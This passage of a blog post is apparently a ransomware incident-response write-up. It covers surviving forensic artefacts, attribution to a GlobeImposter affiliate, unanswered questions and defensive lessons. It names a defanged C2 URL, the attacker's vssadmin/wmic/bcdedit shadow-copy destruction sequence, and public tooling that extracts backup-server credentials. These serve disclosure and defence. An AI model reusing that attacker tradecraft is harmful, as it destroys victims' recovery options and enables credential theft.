+<p>What survives is §7.5, which is measured from evidence still in the store. Note carefully that flat, non-repeating, position-dependent blocks are <strong>evidence for a stream-like construction, not evidence for the absence of AES</strong> — AES-CTR looks exactly like this. The trailer is consistent with RSA-2048 <em>by length alone</em>; the library that produced it is unknown from primary sources.</p>
+<h3 id="82-the-miner-that-probably-wasnt">8.2 The miner that probably wasn't</h3>
+<p>Same discipline, different artefact. Four cryptominer installations were tracked on this host, the earliest <strong>thirteen days after the server was built</strong>, two years before the ransomware. That looks like a long-running compromise.</p>
+<p>The earliest one was fully recovered, because it sat outside the operator's staging tree, and it is the <strong>unmodified official XMRig release</strong> with:</p>
+<ul>
+<li>a <strong>stock, unedited <code>config.json</code></strong> whose pool user is the literal placeholder string shipped in the release,</li>
+<li><code>benchmark_1M.cmd</code> and <code>benchmark_10M.cmd</code> — XMRig's CPU benchmark mode, which mines to nobody,</li>
+<li>a <code>start.cmd</code> of exactly the stock size, no wallet arguments,</li>
+<li><strong>no persistence of any kind</strong> — no service, no Run key, no scheduled task, no IFEO entry.</li>
+</ul>
+<p>A pristine, unconfigured XMRig copied to <code>C:\TMP\</code> two weeks after a server is built reads at least as plausibly as <strong>an administrator benchmarking new hardware</strong> as it does an attacker install. The two <em>later</em> miner installs — in folders named "New folder" in Russian, matching the operator's naming convention elsewhere — are the ones that fit operator behaviour, and both of those folders were deleted and TRIM-zeroed, so their configs and wallets are gone.</p>
+<p>Defensible statement: an unconfigured miner arrived on day 13; two more appeared later in operator-named folders; productive mining is plausible but unproven; <strong>no wallet was recovered from any of them.</strong></p>
+<p>"Seventeen months of cryptomining" would have been a much better headline and a worse finding.</p>
+<hr/>
+<h2 id="9-forensics-under-a-total-event-log-wipe">9. Forensics under a total event-log wipe</h2>
+<p>A field guide to what saved this investigation, with the semantics that matter.</p>
+<p><strong>USN change journal (<code>$UsnJrnl:$J</code>)</strong> — 41.7 MB, 404,202 records. Coverage happened to begin at 19:46 on the attack day, so it caught the entire evening but <em>not</em> the 04:27 toolkit drop, whose timing had to come from MFT <code>$STANDARD_INFORMATION</code> instead. Records file reference number, parent reference, timestamp and reason flags for every change. Does <strong>not</strong> record acting process or user — that is the single biggest limitation, and it is why so many findings above are corroborated from a second artefact. Reason flags worth knowing: <code>BASIC</code> = <code>SetFileTime()</code> (timestomp indicator), <code>OVR</code>/<code>EXT</code>/<code>TRC</code> = overwrite/extend/truncate of <code>$DATA</code>.</p>
+<p><strong>MFT <code>SI</code> vs <code>FN</code></strong> — covered in §6.1. The workhorse of anti-anti-forensics.</p>
+<p><strong>MFT-resident <code>$DATA</code></strong> — small files live inline in their record. Six of seven wipe scripts came back this way, byte-accurate.</p>
+<p><strong>RDP client-side bitmap cache</strong> — <code>Cache000N.bin</code> in the user profile's Terminal Server Client directory. The wipe script cleared the <em>registry</em> RDP history and missed the <em>on-disk</em> cache entirely. These were live, unencrypted, allocated files. They yielded the mount script, the credential-extraction script open in ISE with its comment banner readable, and mimikatz output files open in Notepad.</p>
+<p>Mechanics, since they bite: tiles are 64×64 BGRA, stored <strong>top-down</strong> (my first render came out vertically flipped), and they appear in <strong>cache order, not screen order</strong> — adjacency on a contact sheet carries no positional meaning whatsoever. Do not reconstruct a screen layout from tile adjacency; reconstruct <em>text</em> from tile content and accept that word order across tiles is a guess. The standard tool for this is <code>bmc-tools</code>; I ended up writing a pure-Python parser with a stdlib-<code>zlib</code> PNG encoder because the analysis host had no PIL or numpy.</p>
+<p><strong>UserAssist</strong> (<code>NTUSER.DAT</code>) — GUI-launched programs with run count, <strong>foreground focus count and total focus time in milliseconds</strong>. No other artefact gives you <em>duration</em>. Value names are ROT13-encoded; the structure is 72 bytes with run count at offset 4, focus count at 8, focus time at 12, last-execution FILETIME at 60.</p>
+<p>Two entries reframed the engagement:</p>
+<ul>
+<li>The network scanner: <strong>43 focus events, 38.7 minutes of cumulative foreground time.</strong> My first draft had listed it as staged inventory. It was sustained, interactive, estate-wide reconnaissance by a human being.</li>
+<li>Outbound RDP: <strong>4 runs, 29 minutes of cumulative focus.</strong> The operator used this box as a jump host and went somewhere. No other machine in the estate was ever triaged, so the true scope of lateral movement is not "small" — it is <strong>unmeasured</strong>. That became the largest open question in the whole engagement.</li>
+</ul>
+<p>Critical semantics: <strong>UserAssist records only the <em>most recent</em> execution timestamp.</strong> A run count above 1 means earlier executions exist and are undated. Cumulative focus figures are across all runs and are independent of that timestamp. Reporting "netscan ran at 04:31:13" as <em>the</em> scan time would be wrong; reporting "the operator spent 38.7 minutes in a scanner across 43 sessions" is right.</p>
+<p><strong>Amcache</strong> — inventory of executables with a SHA-1 per entry. Two semantics people get wrong: the event time is the registry key's <strong>lastwrite</strong>, set when the inventory service registers a change, not the file's execution time; and Amcache reflects <strong>disk state at inventory time</strong>, so a rebuilt hive means the <em>absence</em> of an attacker binary proves nothing. Here it placed the anti-forensic LOLBins (<code>vssadmin</code>, <code>wmic</code>, <code>bcdedit</code>, <code>attrib</code>, <code>timeout</code>, <code>net1</code>) at inventory-cycle precision, corroborating the USN's script timings from a second source, and it resolved the <code>systray.exe</code> false lead.</p>
+<p><strong>PCA</strong> (<code>C:\Windows\AppCompat\pca\PcaGeneralDb0.txt</code>) — the Program Compatibility Assistant execution database. UTF-16LE, pipe-delimited: <code>timestamp|resolver|path|product|vendor|version|program_id|message</code>. Underused, and it survived the wipe. A companion file independently caught a backup-product process the next morning.</p>
+<p><strong>SAM <code>F</code> records</strong> — per-account binary structures with last logon, last logoff, password-set time, account expiry, last failed logon, RID, ACB flags, failed count and login count at fixed offsets. Caveat learned the hard way: the <strong>login-count field is unreliable on modern Windows</strong> and reads zero even when last-logon is populated. Trust the FILETIME, not the counter.</p>
+<p><strong><code>RunMRU</code></strong> — what was typed into Win+R. Entries cannot be individually timestamped; you get an <code>MRUList</code> ordering string and the key's lastwrite. In this case it produced five candidate internal hosts for how the toolkit arrived, including one that was typed three times, <code>ping</code>ed, and hosts a share whose name translates to <em>"for writing 500"</em>. A named writable share is a plausible channel for both kit delivery and staging. It also, honestly, contained entries from the responder window — so ordering gives you a <em>sequence</em>, not attribution.</p>
+<p><strong>SRUM</strong> — resource usage per application. Useful for establishing that a binary executed and for volume-level device paths. But note: the per-application <strong>Network Data Usage table does not exist on Windows Server</strong>. The replacement is per-interface and its byte columns did not decode. That is why the exfiltration volume question routes entirely to the network side.</p>
+<p><strong>Runlist recovery — the one primitive that does not work here.</strong> Walking a deleted MFT record's cluster runlist assumes those clusters still hold the old data. <strong>This volume is thin-provisioned with TRIM</strong>: the guest issues UNMAP on delete, VMFS reclaims the blocks, and the content reads back as zeros or as whatever now occupies those clusters. It fails <em>silently and plausibly</em> — you get a file of exactly the expected size, from a record with the right filename, and sometimes with a valid-looking PE header on the front. All 117 files extracted this way from this volume were re-checked against a published 87-hash IOC list: <strong>zero matched</strong>, and of the 61 PE candidates <strong>60 failed at <code>MZ</code> magic</strong>. One of them looked convincing enough to nearly become a published IOC — it was a Windows resource-only DLL that had been allocated the clusters afterwards.</p>
+<p>The gate applied to anything runlist-extracted since: <code>MZ</code> magic <strong>and</strong> a non-empty <code>.text</code> section <strong>and</strong> a non-zero import table <strong>and</strong> <code>AddressOfEntryPoint &gt; 0</code> <strong>and</strong>, where the tool is public, a vendor hash match. Everything that fails is quarantined as documentation of the failure boundary, not retained as evidence.</p>
+<p><strong>Zero attacker binaries were recovered from this host.</strong> Everything in §3 is filename-and-metadata reconstruction from the MFT and USN, and it is labelled as such. Two primitives are <em>not</em> affected and the distinction is worth internalising: <strong>MFT-resident recovery is byte-accurate</strong> (the wipe scripts came out of their records' inline <code>$DATA</code>, one hash-matching a published sample byte-for-byte), and <strong>live allocated files are fine</strong> (the bitmap caches and the browser key store were never deleted).</p>
+<p><strong>Negative results, recorded so nobody mistakes them for unexplored leads:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Artefact</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Guest swap file, 126 MB</td>
+<td>entirely zero-filled before encryption — no memory content exists to recover</td>
+</tr>
+<tr>
+<td>Edge browser history</td>
+<td><code>urls</code> table: <strong>0 rows</strong></td>
+</tr>
+<tr>
+<td>Edge login data, 604 files across 4 snapshots</td>
+<td><code>logins</code> table: <strong>0 rows</strong></td>
+</tr>
+<tr>
+<td>A 64 KB file named like a user hive</td>
+<td><strong>not a hive</strong> — zero non-zero bytes, invalid <code>REGF</code> header, and no such user account exists. Another TRIM-zeroed runlist extraction sitting unlabelled beside five genuine hives</td>
+</tr>
+</tbody>
+</table>
+<p>That last row is the runlist failure mode again, waiting to generate a finding about an account that never existed. Label your quarantined extractions.</p>
+<hr/>
+<h2 id="10-attribution-commodity-kit-one-verified-hash-one-unique-file">10. Attribution: commodity kit, one verified hash, one unique file</h2>
+<p>The kit matches a published threat-intelligence IOC list for a Phobos-family operator: 87 filenames with SHA-1s. How much of that correspondence is <em>verified</em>?</p>
+<ul>
+<li><strong>One file</strong> hash-matched byte-for-byte: a wipe script recovered from its MFT-resident <code>$DATA</code>.</li>
+<li><strong>One content-level match</strong>: both <code>bcdedit</code> lines in the recovered VSS-destruction script match the published sequence exactly, including the <code>bootstatuspolicy ignoreallfailures</code> line.</li>
+<li><strong>Everything else is filename-and-behaviour correspondence.</strong> Eighteen kit files could never be hash-compared because their bytes were never recovered (see §9 on runlist recovery).</li>
+</ul>
+<p>So the shared-kit conclusion rests on two verified files plus strong structural correspondence — not eighteen hash matches. Stating it that way costs nothing and is the difference between an assessment and a claim.</p>
+<p>The ransomware <em>family</em> differs from the published report's (that one is Phobos lineage; this payload is GlobeImposter), but family-switching between engagements is normal affiliate behaviour. The <strong>operator profile</strong> is identical: the same batch and VBS scripts, the same NirSoft credential dumpers, the same Defender-kill approach, the same <code>vssadmin</code>/<code>wmic</code>/<code>wbadmin</code> sequence.</p>
+<h3 id="101-the-encryption-geometry-is-the-discriminator">10.1 The encryption geometry is the discriminator</h3>
+<p>This payload is <em>not</em> Phobos, and the proof is arithmetic rather than assertion. Published Phobos analysis describes a <strong>1.5 MB</strong> size threshold: files below it are encrypted <strong>in full</strong>; files above it get scattered blocks through the body, <strong>with the list of block offsets written into the file metadata</strong> alongside the wrapped key.</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Phobos (published)</th>
+<th>This payload (measured)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Size threshold</td>
+<td>1.5 MB</td>
+<td><strong>~5 MiB</strong></td>
+</tr>
+<tr>
+<td>Below threshold</td>
+<td><strong>fully</strong> encrypted</td>
+<td>8 KiB on / 8 KiB off — <strong>~50 % survives</strong></td>
+</tr>
+<tr>
+<td>Above threshold</td>
+<td>scattered blocks, positions vary</td>
+<td><strong>fixed</strong> 2.5 MiB head + 2.5 MiB tail</td>
+</tr>
+<tr>
+<td>Block map</td>
+<td><strong>stored in metadata</strong></td>
+<td><strong>none</strong> — offsets are deterministic</td>
+</tr>
+<tr>
+<td>Asymmetric</td>
+<td>RSA-1024, hardcoded</td>
+<td>256-byte wrapped key by length; library unknown<sup id="fnref2:crypto"><a class="footnote-ref" href="#fn:crypto">1</a></sup></td>
+</tr>
+<tr>
+<td>Symmetric</td>
+<td>AES-256</td>
+<td>position-dependent keystream; construction unconfirmed<sup id="fnref:crypto"><a class="footnote-ref" href="#fn:crypto">1</a></sup></td>
+</tr>
+</tbody>
+</table>
+<p><strong>That difference is why recovery worked.</strong> Phobos must record where it wrote, because its offsets vary. This encryptor writes at fixed, predictable offsets and records nothing — so every intact block can be located arithmetically without the key. And had this been Phobos, every file under 1.5 MB would have been <strong>fully</strong> encrypted: the browser key store, the registry hives, the client state files. The 40 credentials would have been unrecoverable and §7.4 would not exist.</p>
+<p>A different affiliate's build choice, made for throughput, is the sole reason this incident had a good outcome.</p>
+<h3 id="102-a-named-public-campaign-matches">10.2 A named public campaign matches</h3>
+<p>A published vendor analysis describes the same operator distributing GlobeImposter alongside another ransomware family via RDP-obtained access. Overlaps with this incident:</p>
+<ol>
+<li>ransom-note filename <strong>byte-identical</strong> to ours,</li>
+<li>kit staged in the <strong><code>Music\</code> folder</strong> — same parent-folder convention, different subfolder naming,</li>
+<li><strong>XMRig deployed alongside the ransomware</strong>, matching the miner installs here,</li>
+<li>same tool families — port scanner, mimikatz, NirSoft credential recovery, share scanners,</li>
+<li>same anti-forensics — batch scripts deleting VSS, event logs and RDP history,</li>
+<li>the campaign's ransom-note addresses appear on a government advisory's IOC list for the other family, and the analysis names a C2 endpoint (<code>hxxp://46.148.235[.]114/cmd.php</code>).</li>
+</ol>
+<p>GlobeImposter uses a <strong>per-campaign parameterised file extension</strong> — that report's variant differs from ours by one word. Same family, same operator profile, different campaign build. Notably, <em>this</em> operator's traffic to that named C2 left no trace on the host: no matching string anywhere on the volume. C2 infrastructure is per-affiliate, not per-kit.</p>
+<h3 id="103-one-file-in-the-kit-is-unique">10.3 One file in the kit is unique</h3>
+<p>Of every script in this operator's toolkit, exactly one has <strong>no public sample anywhere</strong> and does not appear in the published IOC list: an 8 KB batch file dropped at the volume root, timestomped to 2023, executed, and deleted within three minutes. Either it is operator-customised — a personalised launcher pointing at their specific payload location — or it comes from a rare kit variant.</p>
+<p>Its exact bytes are permanently unrecoverable through any local or public avenue. It is also, irritatingly, the one file with a genuine timeline anomaly: UserAssist records it executing <strong>eight minutes after</strong> the USN journal records it deleted. Either the deletion attribution is wrong, or the file was re-created, or the UserAssist entry refers to a same-named file elsewhere. Unresolved.</p>
+<hr/>
+<h2 id="11-what-could-not-be-answered-and-where-the-answers-live">11. What could not be answered, and where the answers live</h2>
+<p>A note on scoping before the table: <strong>only one host was ever examined.</strong> Twenty-nine minutes of outbound RDP and thirty-nine minutes of estate-wide scanning establish that the operator went further. The hypervisors, the rebuilt vCenter, the domain controller, the application server, and the five hosts named in <code>RunMRU</code> were never triaged. An incident report that examines one machine out of an estate is a <em>starting</em> document.</p>
+<p>Being explicit about the rest matters more than the findings:</p>
+<table>
+<thead>
+<tr>
+<th>Question</th>
+<th>Why the host cannot answer it</th>
+<th>Where it lives</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Inbound access path</strong></td>
+<td>137 event channels cleared; vCenter rebuilt ten days later; modern ESXi does not log SSH source addresses</td>
+<td>perimeter firewall / log analyser flow data</td>
+</tr>
+<tr>
+<td><strong>Exfiltration volume and destination</strong></td>
+<td>the per-application network table does not exist on Windows Server; the replacement did not decode</td>
+<td>flow logs — <strong>and the unexamined blob-storage client profile on the box</strong></td>
+</tr>
+<tr>
+<td><strong>Miner wallet / pool</strong></td>
+<td>the recovered config is a stock template; the configured copies were deleted and TRIM-zeroed</td>
+<td>outbound flows to pool ports, DNS resolution logs</td>
+</tr>
+<tr>
+<td><strong>Operator C2</strong></td>
+<td>zero artefacts on the volume</td>
+<td>DNS logs, flow logs</td>
+</tr>
+<tr>
+<td><strong>How the toolkit arrived</strong></td>
+<td>no <code>Zone.Identifier</code>, no RDP-clipboard path, no USB evidence; SMB/UNC is the only surviving hypothesis</td>
+<td>the five hosts in <code>RunMRU</code>, their SMB access logs, DC audit logs</td>
+</tr>
+<tr>
+<td><strong>When the host was first compromised</strong></td>
+<td>no surviving log predates the wipe; the artefacts that would date it are ambiguous</td>
+<td>firewall archives; a hypervisor SSH log older than the incident</td>
+</tr>
+<tr>
+<td><strong>What else the operator reached</strong></td>
+<td><strong>only one host was examined</strong></td>
+<td>triage of the rest of the estate</td>
+</tr>
+</tbody>
+</table>
+<p>One log source was never checked and might still matter: at least one hypervisor retains an SSH authentication log going back two years, and it had only ever been searched for the attack month. It sits entirely outside everything the operator wiped.</p>
+<p>And the methodological confession, because it is the largest single risk in the engagement: the NTFS, USN, bitmap-cache and registry work was done with roughly <strong>141 bespoke, unvalidated scripts</strong>. No commercial or peer-reviewed forensic suite was involved at any point. Every finding above that matters should be reproducible with an independent tool, and until it is, that is the honest caveat to attach to all of it.</p>
+<hr/>
+<h2 id="12-takeaways">12. Takeaways</h2>
+<p><strong>If you defend virtualised infrastructure:</strong></p>
+<ul>
+<li>A hypervisor estate can be encrypted with <strong>zero hypervisor-side execution</strong>. If your ESXi detection strategy assumes a Linux encryptor, <code>esxcli</code> calls, or a VM power-off loop, this attack walks past all three.</li>
+<li><strong>Backup infrastructure is credential infrastructure.</strong> A backup server's config database holds decryptable credentials for every hypervisor, guest, SQL instance and cloud repository it touches, and the public tooling to extract them is two kilobytes of PowerShell. Model compromise of the backup server as compromise of everything it backs up — because that is what it is.</li>
+<li><strong>ESXi SSH off by default.</strong> Of every control in this post, that is the one that stops this specific attack outright.</li>
+<li><strong>One password family across vCenter, eleven hosts, the routers and the cloud tenant</strong> means the browser password store <em>is</em> the estate. Eight minutes of harvesting produced everything.</li>
+<li><strong>Never let a server double as a workstation.</strong> The torrent client, the cracked software and the saved passwords were all on the box that mounted every datastore.</li>
+<li><strong>The off-site repository is what saved this one.</strong> It was active ninety minutes before the attack and the ransomware could not reach it. Every other control failed.</li>
+</ul>
+<p><strong>If you respond to these:</strong></p>
+<ul>
+<li><strong>Assume intermittent encryption. Measure the pattern before you assume a disk is lost.</strong> 97 % recovery here came from backup GPT headers, ext4 backup superblocks and NTFS backup boot sectors sitting outside a fixed blast radius, by pure geometry.</li>
+<li><strong>Then apply the same logic downward.</strong> Half of every small encrypted file is plaintext. For page-oriented formats — SQLite, ESE, bencode — that is frequently the whole record you wanted.</li>
+<li><strong>When event logs are gone, the wipe kits are consistently incomplete.</strong> USN, MFT SI-vs-FN, PCA, UserAssist, Amcache and the RDP bitmap cache all survived a deliberate seven-script wipe here and between them reconstructed a seventeen-hour session to the second.</li>
+<li><strong>Learn your artefacts' semantics, not just their locations.</strong> UserAssist timestamps are <em>last</em> execution. Amcache times are inventory events. SRUM's device paths shift across time. SAM's login counter lies. Each of those nearly produced a wrong finding.</li>
+<li><strong>Do not trust runlist recovery on thin-provisioned TRIM storage.</strong> It fails silently and plausibly. Gate every extraction structurally, and quarantine what fails.</li>
+<li><strong>Corroborate from a second artefact class before anything leaves your hands as an IOC.</strong> One hash in this case would have been a Microsoft resource DLL.</li>
+</ul>
+<p><strong>And on writing the report:</strong></p>
+<p>Several claims in this engagement did not survive contact with primary evidence — a crypto analysis run against the wrong binaries, a "recovered" file that was a system DLL, a two-year cryptomining narrative that was probably a benchmark. Every one of them was <em>plausible</em>, and most of them made a better story than the truth.</p>
+<p>Write the negative results down next to the findings. Write the retractions down next to the conclusions. Say "earliest candidate" when that is what you have, and "two verified files plus behavioural correspondence" when that is what the attribution rests on. A report that only lists what held up is a report nobody can calibrate — including you, six months later, when someone asks how firmly you actually know the thing you wrote.</p>
+<div class="footnote">
+<hr/>
+<ol>
+<li id="fn:crypto">
+<p>The last two rows are exactly the claims retracted in §8.1. They are shown as unconfirmed rather than removed because the <em>geometry</em> rows above them are measured, and the contrast between block-map-in-metadata and deterministic-offsets is the whole argument. <a class="footnote-backref" href="#fnref:crypto" title="Jump back to footnote 1 in the text">↩</a><a class="footnote-backref" href="#fnref2:crypto" title="Jump back to footnote 1 in the text">↩</a></p>
+</li>
+</ol>
+</div>
+  <!--
+  <!-- Giscus -->
+  <!-- https://squidfunk.github.io/mkdocs-material/setup/adding-a-comment-system/#giscus-integration -->
+  <hr>
+  <h2 id="__comments">Comments</h2>
+  <script src="https://giscus.app/client.js"
+        data-repo="ZhymabekRoman/zhymabekroman.github.io"
+        data-repo-id="R_kgDOJdrLtg"
+        data-category="General"
+        data-category-id="DIC_kwDOJdrLts4CXH2Q"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="preferred_color_scheme"
+        data-lang="en"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+  </script>
+
+  <!-- Reload on palette change -->
+  <script>
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object")
+      if (palette.color.scheme === "slate") {
+        var giscus = document.querySelector("script[src*=giscus]")
+        giscus.setAttribute("data-theme", "dark")
+      }
+
+    /* Register event handlers after documented loaded */
+    document.addEventListener("DOMContentLoaded", function() {
+      var ref = document.querySelector("[data-md-component=palette]")
+      ref.addEventListener("change", function() {
+        var palette = __md_get("__palette")
+        if (palette && typeof palette.color === "object") {
+          var theme = palette.color.scheme === "slate" ? "dark" : "light"
+
+          /* Instruct Giscus to change theme */
+          var frame = document.querySelector(".giscus-frame")
+          frame.contentWindow.postMessage(
+            { giscus: { setConfig: { theme } } },
+            "https://giscus.app"
+          )
+        }
+      })
+    })
+  </script>
+
+
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+        
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../ui-design_the-bad-and-the-good/" class="md-footer__link md-footer__link--prev" aria-label="Previous: UI design - the bad and the good">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                UI design - the bad and the good
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../message-from-sts.gov.kz/" class="md-footer__link md-footer__link--next" aria-label="Next: Message from sts.gov.kz">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Message from sts.gov.kz
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["announce.dismiss", "content.action.edit", "content.action.view", "content.code.annotate", "content.code.copy", "content.tooltips", "navigation.footer", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.tabs.sticky", "navigation.top", "search.highlight", "search.suggest", "toc.follow"], "search": "../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.c8b220af.min.js"></script>
+      
+        <script src="../../javascripts/yandex_metrika.js"></script>
+      
+    
+  </body>
+</html>
